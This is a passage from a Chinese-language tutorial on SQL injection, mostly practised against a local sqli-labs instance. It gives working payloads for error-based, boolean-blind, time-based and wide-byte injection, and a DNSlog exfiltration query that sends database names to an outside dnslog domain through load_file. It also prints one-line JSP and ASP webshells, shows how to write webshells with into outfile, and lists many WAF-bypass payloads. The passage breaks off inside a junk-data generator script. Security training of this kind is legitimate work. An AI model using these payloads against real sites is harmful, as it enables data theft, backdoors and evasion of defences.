src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316396841-2c7ec9f0-a27a-48b3-9ad8-9715de47e1d5.png#align=left&display=inline&height=101&margin=%5Bobject%2Object%5D&name=image.png&originHeight=201&originWidth=554&size=29017&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h4 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h4><p>通过报错函数updatexml()、extractvalue()配合子查询将数据借助报错信息输出给我们的一种注入。在渗透测试过程中，经常会遇到网站因为用户的一些操作而产生代码运行错误并将错误信息返回到页面中的情况，这种时候可以通过报错注入获取数据。接下来将详细介绍如何进行报错注入。<br>1、在传参中输入单引号让页面产生错误，这里看到将报错信息返回到页面了。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316496319-6b800c29-3255-48ee-ae2a-ca92277fe4bd.png#align=left&display=inline&height=82&margin=%5Bobject%2Object%5D&name=image.png&originHeight=164&originWidth=554&size=28491&status=done&style=none&width=277\" alt=\"image.png\"><br>2、尝试通过单引号和%23注释来进行闭合发现闭合错误，这时候就需要考虑，是否当前页面的传参本身没有单引号，不需要闭合。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316499725-53ea45fc-d881-4eca-921b-b7d961e7afb2.png#align=left&display=inline&height=88&margin=%5Bobject%2Object%5D&name=image.png&originHeight=175&originWidth=554&size=30016&status=done&style=none&width=277\" alt=\"image.png\"><br>3、删除单引号与%23，发现页面正常了，说明这里为int类型的传参，不需要单引号闭合。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316504397-5e9319dd-d6dc-4647-a85e-26b188524505.png#align=left&display=inline&height=110&margin=%5Bobject%2Object%5D&name=image.png&originHeight=220&originWidth=554&size=26175&status=done&style=none&width=277\" alt=\"image.png\"><br>4、使用报错函数updataxml()查询当前数据库库名。payload如下：<br>?id=1 and updatexml(1,concat(0x7e,(select database())),1)<br>这里updatexml的语法为后面跟上3个数据，我们在第二个数据中拼接0x7e和子查询(select database())来获取数据。这里0x7e为十六进制的~，用来使函数报错的，没有实际意义。子查询即在括号中的查询语句，与数学中一样，括号中的东西先执行。所以这里的流程为先子查询获取了数据，然后拼接波浪线报错，输出到页面中。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316508649-186ae432-4135-45af-8370-2e0fc3b94bf2.png#align=left&display=inline&height=93&margin=%5Bobject%2Object%5D&name=image.png&originHeight=185&originWidth=554&size=20405&status=done&style=none&width=277\" alt=\"image.png\"><br>5、获取flag表中的数据。<br><a href=\"http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-2/?id=1\">http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-2/?id=1</a> and updatexml(1,concat(0x7e,(select flag from flag)),1)<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316512988-f6e5a40c-b74e-419d-be49-cd685253756a.png#align=left&display=inline&height=75&margin=%5Bobject%2Object%5D&name=image.png&originHeight=150&originWidth=554&size=23007&status=done&style=none&width=277\" alt=\"image.png\"><br>6、因为报错函数输出的东西有长度限制，所以对于这种数据长度值超过的数据，我们需要通过截取函数substring()来获得。<br>获取第一个字符开始的20个数据：<br>?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),1,20)),1)<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316517210-28964bb5-8a4e-44d1-bc99-5a5bbad1eee9.png#align=left&display=inline&height=94&margin=%5Bobject%2Object%5D&name=image.png&originHeight=188&originWidth=554&size=23621&status=done&style=none&width=277\" alt=\"image.png\"><br>获取第21个字符开始的20个数据，（不足20个则显示剩下的数据）：<br>?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),21,20)),1)<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316521329-2c232ccc-5430-4284-ab38-335b355f6316.png#align=left&display=inline&height=94&margin=%5Bobject%2Object%5D&name=image.png&originHeight=188&originWidth=554&size=21660&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h3 id=\"盲注\"><a href=\"#盲注\" class=\"headerlink\" title=\"盲注\"></a>盲注</h3><p>对于SQL注入的测试过程中存在这样的情况，输入的传参只会返回是否有数据而不会将查询的东西输出到页面上，然后不显示错误页面，这种时候就要尝试盲注来获取数据。盲注又分为布尔盲注和延时盲注。</p>\n<h4 id=\"布尔盲注\"><a href=\"#布尔盲注\" class=\"headerlink\" title=\"布尔盲注\"></a>布尔盲注</h4><p>布尔盲注，盲注的一种，当网站通过查询语句的布尔值返回真假来输出页面信息的时候，查询语句为真，页面输出内容；查询语句为假，页面不输出内容。那么这里就可以通过构造等号判断，获取相应的字符的ascii码，最后还原出数据。具体测试过程如下：<br>1、id传参1之后，页面返回有数据，这里明显不能进行显错注入了。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316537064-402e041f-a4e4-4fd1-9cb4-16013920503e.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=20549&status=done&style=none&width=277\" alt=\"image.png\"><br>2、在传参后面加个单引号，页面返回空，不显示错误信息，不能使用报错注入。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316541341-930c7ffa-7210-4f74-8b39-8237df940d48.png#align=left&display=inline&height=110&margin=%5Bobject%2Object%5D&name=image.png&originHeight=220&originWidth=554&size=19624&status=done&style=none&width=277\" alt=\"image.png\"><br>3、通过拼接and 1=1和and 1=2，发现页面对于布尔值的真与假返回的页面结果也不同。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316545416-9133ab8b-c70f-421d-b7ad-d1cb876f11e0.png#align=left&display=inline&height=102&margin=%5Bobject%2Object%5D&name=image.png&originHeight=203&originWidth=554&size=19835&status=done&style=none&width=277\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316549309-b0d686cf-f662-490a-89b3-fdcfe1722712.png#align=left&display=inline&height=104&margin=%5Bobject%2Object%5D&name=image.png&originHeight=208&originWidth=554&size=19652&status=done&style=none&width=277\" alt=\"image.png\"><br>4、通过length()函数判断数据库库名的长度大于1。<br>?id=1’ and length(database())&gt;1 %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316553774-792e2acb-2d05-4197-9c29-bb4345492ad1.png#align=left&display=inline&height=97&margin=%5Bobject%2Object%5D&name=image.png&originHeight=193&originWidth=554&size=19558&status=done&style=none&width=277\" alt=\"image.png\"><br>5、在大于8的时候页面返回空，所以数据库库名长度等于8。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316557258-2afe4840-2c0c-4193-9f1d-f3065f5cc6c7.png#align=left&display=inline&height=98&margin=%5Bobject%2Object%5D&name=image.png&originHeight=195&originWidth=554&size=16991&status=done&style=none&width=277\" alt=\"image.png\"><br>6、通过ascii()函数和substr ()截取函数获取数据库库名的第一个字符的ascii码<br>?id=1’ and ascii(substr((select database()),1,1))&gt;97 %23<br>?id=1’ and ascii(substr((select database()),1,1))=101 %23<br>首先用大于号判断出大概所处的值，最后使用等于号验证ascii码的值。此处得出数据库库名的第一个字符的ascii码值为115，对应字符为s。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316561360-9e4bca64-de7b-4610-8b86-14ae35a9298d.png#align=left&display=inline&height=99&margin=%5Bobject%2Object%5D&name=image.png&originHeight=197&originWidth=554&size=20301&status=done&style=none&width=277\" alt=\"image.png\"><br>7、更改截取的位置，判断后面的字符对应的ascii码值。<br>?id=1’ and ascii(substr((select database()),2,1))=101 %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316565188-122d2ff2-501a-43e1-b1fb-bef02524ff60.png#align=left&display=inline&height=98&margin=%5Bobject%2Object%5D&name=image.png&originHeight=196&originWidth=554&size=19995&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h4 id=\"延时盲注\"><a href=\"#延时盲注\" class=\"headerlink\" title=\"延时盲注\"></a>延时盲注</h4><p>延时盲注，一种盲注的手法。在渗透测试过程中当我们不能使用显错注入、报错注入以及布尔盲注无论布尔值为真还是为假，页面都返回一样之后，我们可以尝试使用延时盲注，通过加载页面的时间长度来判断数据是否成功。在PHP中有一个if()函数，语法为if(exp1,exp2,exp3)，当exp1返回为真时，执行exp2，返回为假时，执行exp3。配合延时函数sleep()来获取相应数据的ascii码，最后还原成数据。下面我将通过实例来介绍如今进行延时盲注。<br>1、首先获取的页面如下，后面不论接上布尔值为真还是为假的，页面都返回一样，此时将不能使用布尔盲注。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316574305-a750e1da-86b1-452c-ad5e-dc2d2916fb80.png#align=left&display=inline&height=195&margin=%5Bobject%2Object%5D&name=image.png&originHeight=195&originWidth=554&size=19760&status=done&style=none&width=554\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316578704-29275196-b0bf-4a49-896e-acfa907a811f.png#align=left&display=inline&height=205&margin=%5Bobject%2Object%5D&name=image.png&originHeight=205&originWidth=554&size=20224&status=done&style=none&width=554\" alt=\"image.png\"><br>2、通过and拼接延时函数查看页面是否有延时回显。首先记录没有使用延时函数的页面返回时间，为4._秒；使用sleep(5)延时5秒之后，页面响应时间为9._秒，说明对于我们输入的sleep()函数进行了延时处理，此处存在延时盲注。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316631400-e6e26c83-57e3-4745-8bdf-b41f34d87222.png#align=left&display=inline&height=80&margin=%5Bobject%2Object%5D&name=image.png&originHeight=160&originWidth=554&size=68367&status=done&style=none&width=277\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316634717-9fb75a2d-6415-4b77-a5e1-551fef19d90a.png#align=left&display=inline&height=77&margin=%5Bobject%2Object%5D&name=image.png&originHeight=154&originWidth=554&size=62202&status=done&style=none&width=277\" alt=\"image.png\"><br>3、通过延时注入判断数据库库名的长度。一个个测试发现当长度等于8时页面延时返回了，说明数据库库名长度为8。<br>?id=2’ and if((length(database())=8),sleep(5),1) %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316640888-0a021ca3-416e-49b5-a2ae-b58b989f0403.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=222&originWidth=554&size=81658&status=done&style=none&width=277\" alt=\"image.png\"><br>4、与布尔盲注一样，将子查询的数据截断之后判断ascii码，相等时延时5秒。最后得到第一个字符的ascii码为115。<br>?id=2’ and if((ascii(substr((select database()),1,1))=115),sleep(5),1) %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316644693-f9bed0ca-cd60-486b-85e5-24dc016a547e.png#align=left&display=inline&height=96&margin=%5Bobject%2Object%5D&name=image.png&originHeight=192&originWidth=554&size=79429&status=done&style=none&width=277\" alt=\"image.png\"><br>5、后面替换截断的位置，测试后面的字符的ascii码值。最后得到对应的ascii码值为115 101 99 117 114 105 116 121。通过ascii解码工具解得数据库库名为security。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316649328-e68000df-34d7-4dfb-b2fe-88d147b1ae3f.png#align=left&display=inline&height=382&margin=%5Bobject%2Object%5D&name=image.png&originHeight=382&originWidth=533&size=28250&status=done&style=none&width=533\" alt=\"image.png\"></p>\n<h3 id=\"宽字节注入\"><a href=\"#宽字节注入\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h3><p>为了防止sql注入，在网站配置上会开启魔术引号。当打开时，所有的 ‘（单引号），”（双引号），\\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。也就是说，在我们输入’（单引号）或者”（双引号）进行闭合的时候，程序会自动在前面加上\\（反斜线），将其转义成字符串，也就是失去了本来的用法，变成了字符串输入，无法进行闭合，即不能使输入的代码正常执行。<br>在mysql中，用于转义的函数有addslashes()，mysql_real_escape_string()，mysql_escape_string()等。</p>\n<h4 id=\"宽字节注入具体解析过程\"><a href=\"#宽字节注入具体解析过程\" class=\"headerlink\" title=\"宽字节注入具体解析过程:\"></a>宽字节注入具体解析过程:</h4><p>1、在id传参后面加上%df和单引号<br>2、$_GET[‘id’] 经过 addslashes编码之后带入了‘\\’，即?id=1%df\\’ and 1=1 %23<br>url编码为：?id=1%df%5C%27%20and%201%3D1%20%23<br>3、PHP将处理好的数据带入mysql处理时使用了gbk编码<br>4、%df%5c 编码后为“運” 成功的吃掉了%5c，也就是\\（反斜线）<br>5、处理后的查询数据为?id=1運’ and 1=1 %23，单引号成功闭合</p>\n<h4 id=\"实例演示：\"><a href=\"#实例演示：\" class=\"headerlink\" title=\"实例演示：\"></a>实例演示：</h4><p>1、在id传参之后加个单引号，我设置了将传参输出出来，可以看到单引号前面加了一个反斜线。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316688943-fc742097-f3f9-40f1-b326-a4dd94d9691f.png#align=left&display=inline&height=217&margin=%5Bobject%2Object%5D&name=image.png&originHeight=435&originWidth=554&size=138295&status=done&style=none&width=277\" alt=\"image.png\"><br>2、通过宽字节注入将反斜线“吃”掉，合成一个汉字，这里因为浏览器设置的字符为UTF-8，所以输出的汉字为�。通过页面报错可以判断出，单引号已成功闭合。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316696285-c4740da5-d4f3-4e5e-b82e-a102fbba775d.png#align=left&display=inline&height=232&margin=%5Bobject%2Object%5D&name=image.png&originHeight=463&originWidth=554&size=157491&status=done&style=none&width=277\" alt=\"image.png\"><br>3、接下来通过order by判断数据库当前字段数，因为order by 4的时候页面报错了，所以当前字段数为3。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316701085-c5629ba1-eecd-4178-b782-2c8d1e94f979.png#align=left&display=inline&height=149&margin=%5Bobject%2Object%5D&name=image.png&originHeight=298&originWidth=554&size=111411&status=done&style=none&width=277\" alt=\"image.png\"><br>4、通过union select 判断出注入点为2和3。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316704781-2eaf1548-62d5-40ca-88a4-14d15e5d6846.png#align=left&display=inline&height=158&margin=%5Bobject%2Object%5D&name=image.png&originHeight=315&originWidth=554&size=114990&status=done&style=none&width=277\" alt=\"image.png\"><br>5、通过注入点3获取flag数据表中的flag字段的数据。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316709078-a312c8bf-4c31-4804-8a5f-8d9d9f550a58.png#align=left&display=inline&height=142&margin=%5Bobject%2Object%5D&name=image.png&originHeight=284&originWidth=554&size=110536&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h2 id=\"巧用dnslog进行SQL注入\"><a href=\"#巧用dnslog进行SQL注入\" class=\"headerlink\" title=\"巧用dnslog进行SQL注入\"></a>巧用dnslog进行SQL注入</h2><p>前面介绍了SQL注入中的盲注，通过布尔盲注或者延时盲注来获取数据需要的步骤非常繁琐，不仅需要一个一个字符的获取，最后还需要进行ascii解码，这需要花费大量的时间与精力。为了加快渗透进程，以及降低获取数据的难度，这里介绍如何通过dnslog进行SQL注入。</p>\n<h3 id=\"Dnslog\"><a href=\"#Dnslog\" class=\"headerlink\" title=\"Dnslog\"></a>Dnslog</h3><p>dnslog，即dns日志，会解析访问dns服务的记录并显示出来，常被用来测试漏洞是否存在以及无法获取数据的时候进行外带数据。简单来说，dnslog就是一个服务器，会记录所有访问它的记录，包括访问的域名、访问的IP以及时间。那么我们就可以通过子查询，拼接dnslog的域名，最后通过dns日志得到需要的数据。</p>\n<h3 id=\"Load-file-函数\"><a href=\"#Load-file-函数\" class=\"headerlink\" title=\"Load_file()函数\"></a>Load_file()函数</h3><p>数据库中的load_file()函数，可以加载服务器中的内容。load_file(‘c:/1.txt’)，读取文件并返回内容为字符串，使用load_file()函数获取数据需要有以下几个条件：<br>1.文件在服务器上<br>2.指定完整路径的文件<br>3.必须有FILE权限</p>\n<h3 id=\"UNC路径\"><a href=\"#UNC路径\" class=\"headerlink\" title=\"UNC路径\"></a>UNC路径</h3><p>UNC路径就是类似\\softer这样的形式的网络路径。它符合 \\服务器名\\服务器资源的格式。在Windows系统中常用于共享文件。如\\192.168.1.1\\共享文件夹名。</p>\n<h3 id=\"Dnslog注入实例演示\"><a href=\"#Dnslog注入实例演示\" class=\"headerlink\" title=\"Dnslog注入实例演示\"></a>Dnslog注入实例演示</h3><p>1、打开实例站点，很明显这里是只能使用盲注的站点。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316770534-feb5fdac-7aaa-4ab5-b3ae-5fee2527e378.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=273&originWidth=554&size=93920&status=done&style=none&width=277\" alt=\"image.png\"><br>2、通过order by判断出字段数为3。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316780268-de0c44d2-5a42-4df4-8494-a5ed756a6a74.png#align=left&display=inline&height=159&margin=%5Bobject%2Object%5D&name=image.png&originHeight=318&originWidth=554&size=123643&status=done&style=none&width=277\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316786769-374898f3-3106-480a-a051-e052e96a70d9.png#align=left&display=inline&height=153&margin=%5Bobject%2Object%5D&name=image.png&originHeight=305&originWidth=554&size=116956&status=done&style=none&width=277\" alt=\"image.png\"><br>3、在dnslog网站申请一个dnslog域名：pcijrt.dnslog.cn<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316791333-e038d4ba-3515-4425-a67c-dd7c505975a8.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=32567&status=done&style=none&width=277\" alt=\"image.png\"><br>4、通过load_file函数拼接查询数据库库名的子查询到dnslog的域名上，后面任意接一个不存在的文件夹名。最后将这个查询放到联合查询中，构造的payload如下：<br>?id=1 ‘ union select 1,2,load_file(concat(‘//‘,(select database()),’.pcijrt.dnslog.cn<br>/abc’)) %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316796222-379b515f-d134-405f-91cf-d1e33861c093.png#align=left&display=inline&height=96&margin=%5Bobject%2Object%5D&name=image.png&originHeight=192&originWidth=554&size=90883&status=done&style=none&width=277\" alt=\"image.png\"><br>5、执行语句之后在dnslog日志中获取到数据库库名为security。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316800618-e7303cd5-9bdb-47de-aeda-5ced9575829d.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=38670&status=done&style=none&width=277\" alt=\"image.png\"><br>6、修改子查询里的内容，获取其他数据。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316804136-4715642b-040c-4f5a-8e0c-29d883c01903.png#align=left&display=inline&height=123&margin=%5Bobject%2Object%5D&name=image.png&originHeight=246&originWidth=554&size=92826&status=done&style=none&width=277\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316855097-fc68b2f4-3483-4996-818a-3890d70aa7ac.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=46229&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h2 id=\"SQL注入写入webshell\"><a href=\"#SQL注入写入webshell\" class=\"headerlink\" title=\"SQL注入写入webshell\"></a>SQL注入写入webshell</h2><h3 id=\"Webshell\"><a href=\"#Webshell\" class=\"headerlink\" title=\"Webshell\"></a>Webshell</h3><p>Webshell，以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。攻击者可以通过获取webshell来对网站进行操作，包括任意文件上传下载、查看数据库、执行任意程序代码等。常见webshell分类如下：<br><strong>jsp</strong><br>&lt;%Runtime.getRuntime().exec(request.getParameter(“i”));%&gt;<br><strong>asp</strong><br>success!!!!&lt;%eval request(“cmd”)%&gt;<br><strong>php</strong></p>\n<h3 id=\"out-file-amp-dump-file\"><a href=\"#out-file-amp-dump-file\" class=\"headerlink\" title=\"out_file&amp;dump_file\"></a>out_file&amp;dump_file</h3><p>在dnslog注入中我们了解到了mysql数据库中可以通过load_file加载读取服务器上的文件，与之对应的则是通过out_file和dump_file读取文件。写入webshell需要具有几个条件：当前数据库用户为root、具有写入文件的权限、拥有当前站点的绝对路径。<br>通过sql注入写webshell的具体用法：<br>select  into outfile ‘C:/phpStudy/WWW/1.php’<br>select  into dumpfile ‘C:/phpStudy/WWW/1.php’<br>二者的区别在于，outfile函数可以导出多行，而dumpfile只能导出一行数据；outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式。<br>在写文件的时候，因为是在传参中写入的，总会被一些单引号，美元符等具有特殊意义的字符影响，这时候我们能够通过将需要传输的文件内容进行16进制转换再传入数据库中执行，mysql数据库会解析16进制的内容，那么就可以不受特殊字符影响写入webshell了。</p>\n<h2 id=\"SQL注入如何绕过waf\"><a href=\"#SQL注入如何绕过waf\" class=\"headerlink\" title=\"SQL注入如何绕过waf\"></a>SQL注入如何绕过waf</h2><p>在进行渗透测试的时候，经常会遇到被waf拦截的情况。waf，也就是网站防火墙，专业术语是Web应用防护系统，即Web Application Firewall。Waf对于渗透测试人员来说，也就是规则，通俗点就是这个结构:<br>If(xxx){<br>拦截！<br>}else{<br>通过<br>}<br>所以只需要让它同意我的操作，即绕过了waf。通常的waf一般可以有以下绕过方法：</p>\n<h4 id=\"1、大小写绕过\"><a href=\"#1、大小写绕过\" class=\"headerlink\" title=\"1、大小写绕过\"></a>1、大小写绕过</h4><p>?id=1 and UnIoN sElEcT 1,2,3<br>?id=1 OrDeR By 1</p>\n<h4 id=\"2、双写绕过\"><a href=\"#2、双写绕过\" class=\"headerlink\" title=\"2、双写绕过\"></a>2、双写绕过</h4><p>一些防护措施只进行一次，可以通过双写关键字的方法绕过。<br>Id=1 ununionion selselectect 1,2,3 删除一次–&gt; union select<br>Id=1 ororderder bbyy    1    删除一次–&gt; order by</p>\n<h4 id=\"3、编码绕过\"><a href=\"#3、编码绕过\" class=\"headerlink\" title=\"3、编码绕过\"></a>3、编码绕过</h4><p>如果检测的是关键字，那么经过编码即可绕过<br>URL全编码：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316953774-1c273318-df76-4e94-a6d4-3a05b0aa9057.png#align=left&display=inline&height=85&margin=%5Bobject%2Object%5D&name=image.png&originHeight=170&originWidth=554&size=32436&status=done&style=none&width=277\" alt=\"image.png\"><br>十六进制（使用时需要在转换后的字符串前加0x，作为告诉数据库这里是十六进制的标识）：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316957860-0c58f7b6-544c-4125-9937-5e35e01e675f.png#align=left&display=inline&height=120&margin=%5Bobject%2Object%5D&name=image.png&originHeight=240&originWidth=554&size=17636&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h4 id=\"4、基本符号替换\"><a href=\"#4、基本符号替换\" class=\"headerlink\" title=\"4、基本符号替换\"></a>4、基本符号替换</h4><p>用&amp;&amp;替换and<br>用||替换or<br>用/**/替换空格<br>URL栏中用+替换空格</p>\n<h4 id=\"5、报错注入替换函数绕过\"><a href=\"#5、报错注入替换函数绕过\" class=\"headerlink\" title=\"5、报错注入替换函数绕过\"></a>5、报错注入替换函数绕过</h4><p>有的时候，网站只检测一部分热门的函数，不检测一些冷门的函数。下面以select user() 为例，给出几种报错注入的payload：<br>1.floor()<br>id = 1 and (select 1 from  (select count(_),concat(user(),floor(rand(0)_2))x from  information_schema.tables group by x)a)<br>2. extractvalue()<br>id = 1 and (extractvalue(1, concat(0x5c,(select user()))))<br>id = 1 and extractvalue(1,concat(char(126),database()))<br>3. updatexml()<br>id = 1 and (updatexml(0x3a,concat(1,(select user())),1))</p>\n<p>4.exp()<br>exp(~(select * from(select user()))a))</p>\n<p>5.GeometryCollection()<br>Id=1 and GeometryCollection((select _ from(select _ from(select user())a)b))</p>\n<p>6.Polygon</p>\n<p>Id = 1 and polygon((select _ from (select _ from(select user())a)b))</p>\n<p>7.Multipoint()</p>\n<p>Id = 1 and Multipoint ((select _ from (select _ from(select user())a)b))</p>\n<p>8.Multilinestring()</p>\n<p>Id = 1 and Multilinestring ((select _ from (select _ from(select user())a)b))</p>\n<p>9.multipolygon</p>\n<p>Id = 1 and multipolygon ((select _ from (select _ from(select user())a)b))</p>\n<p>10.linestring()</p>\n<p>Id = 1 and linestring ((select _ from (select _ from(select user())a)b))</p>\n<h4 id=\"6、其他等价函数绕过\"><a href=\"#6、其他等价函数绕过\" class=\"headerlink\" title=\"6、其他等价函数绕过\"></a>6、其他等价函数绕过</h4><p>hex()、bin() ==&gt; ascii()<br>sleep() &gt;benchmark()<br>concat_ws()&gt;group_concat()<br>mid()、substr() ==&gt; substring()<br>@<a href=\"/user\">@user </a> ==&gt; user()<br>@<a href=\"/database\">@database </a> ==&gt; database() </p>\n<h4 id=\"7、内联注释配合注释绕过\"><a href=\"#7、内联注释配合注释绕过\" class=\"headerlink\" title=\"7、内联注释配合注释绕过\"></a>7、内联注释配合注释绕过</h4><p>Id=1/**//<em>! order</em>/+/<em>!by</em>/+1</p>\n<h4 id=\"8、-0a换行跳出单行注释绕过\"><a href=\"#8、-0a换行跳出单行注释绕过\" class=\"headerlink\" title=\"8、%0a换行跳出单行注释绕过\"></a>8、%0a换行跳出单行注释绕过</h4><p>原理：数据库中对于#和–（空格）后面的东西都进行注释忽略处理<br>我们通过waf一般不会处理注释内的东西这一特性进行绕过，在%23（url解码为#）后面放%0a换行再放入执行语句，中间可以多次经过%23%0a进行绕过。ps:在%23和%0a中间可以随意加入字符，放置注释掉了。<br>Payload：<br>id=2%20+%231q%0AOrDeR%20%23adsf%0A%23%0ABy%201<br>id=-2%20+%231q%0AuNiOn%20all%23adsf%0A%23%0AsEleCt%201,2,3</p>\n<h4 id=\"9、利用一些中间件的缺陷\"><a href=\"#9、利用一些中间件的缺陷\" class=\"headerlink\" title=\"9、利用一些中间件的缺陷\"></a>9、利用一些中间件的缺陷</h4><p>（1）IIS+ASP<br>通过在关键词之间加%绕过。Id=1 and uni%on se%le%ct 1,2,3 from ad%min<br>（2）IIS的Unicode编码<br>IIS支持Unicode编码，可以通过编码关键词进行绕过：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316976370-63e00d2f-1d76-4702-a4ad-53ff3433f16a.png#align=left&display=inline&height=60&margin=%5Bobject%2Object%5D&name=image.png&originHeight=120&originWidth=554&size=13102&status=done&style=none&width=277\" alt=\"image.png\"><br>（3）HTTP参数污染<br>有的时候，浏览器对于这样的传参会出现以下情况：<br>Id=1 and id=2 –&gt; 出现在服务器中，id=1,2<br>那么我们可以这样绕：<br>id=1 and union select username &amp; id= password form admin<br>–&gt; id=1 and union select username, password form admin</p>\n<p>对于这种参数重复传参的情况，不同环境有不同结果：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316984361-71fe98b2-2426-402d-b268-79db169fbe80.png#align=left&display=inline&height=148&margin=%5Bobject%2Object%5D&name=image.png&originHeight=296&originWidth=554&size=37024&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h4 id=\"10、更换传参方式绕过\"><a href=\"#10、更换传参方式绕过\" class=\"headerlink\" title=\"10、更换传参方式绕过\"></a>10、更换传参方式绕过</h4><p>在有些情况下，因为$_REQUEST[‘id’]的特性，我们可以将get传参的id=1切换成post传参，有些waf只针对了get传参进行防御而忽略了post传参或者cookie传参。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316989645-f827a3cc-d359-4246-9d0f-13eb04fd7b84.png#align=left&display=inline&height=124&margin=%5Bobject%2Object%5D&name=image.png&originHeight=248&originWidth=554&size=48512&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h4 id=\"11、利用数据提取方式的缺陷进行绕过\"><a href=\"#11、利用数据提取方式的缺陷进行绕过\" class=\"headerlink\" title=\"11、利用数据提取方式的缺陷进行绕过\"></a>11、利用数据提取方式的缺陷进行绕过</h4><p>Example：<br>在PHP+Apache中<br>x=1&amp;y=2&amp;z=3 在某些waf中会被提取为：<br>x=1<br>y=2<br>z=3<br>payload:<br>id=1+union+/<em>&amp;x=2</em>/+select/<em>&amp;y=3</em>/+1,2,3+from+admin<br>waf检测方式为分别检测三个传参：<br>id=1+union+/*<br>x=2_/+select/_<br>y=3*/1,2,3+from+admin</p>\n<p>数据库中，/**/中间的东西被过滤了，获得的传参为：<br>id=1+union+select+1,2,3+from+admin</p>\n<h4 id=\"12、脏数据绕过\"><a href=\"#12、脏数据绕过\" class=\"headerlink\" title=\"12、脏数据绕过\"></a>12、脏数据绕过</h4><p>在被waf拦截之后，更改传参方式为POST，再通过在传参处放入大量无用数据绕过waf。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316997116-7a6e21e0-2b25-4f10-b49c-e767e0216794.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=288&originWidth=554&size=125231&status=done&style=none&width=277\" alt=\"image.png\"><br>下面给出生成垃圾数据的脚本：<br>#coding=utf-8<br>import random,string<br>from urllib import parse<br>code by yzddMr6</p>\n<p>varname_min = 5<br>varname_max = 15<br>data_min = 20<br>data_max = 25<br>num_min = 50<br>num_max = 100<br>def randstr(length):<br>str_list = [random.choice(string.ascii_letters) for i in range(length)]<br>random_str = ‘’.join(str_list)<br>return random_str<br>def main():<br>data={}<br>for i in 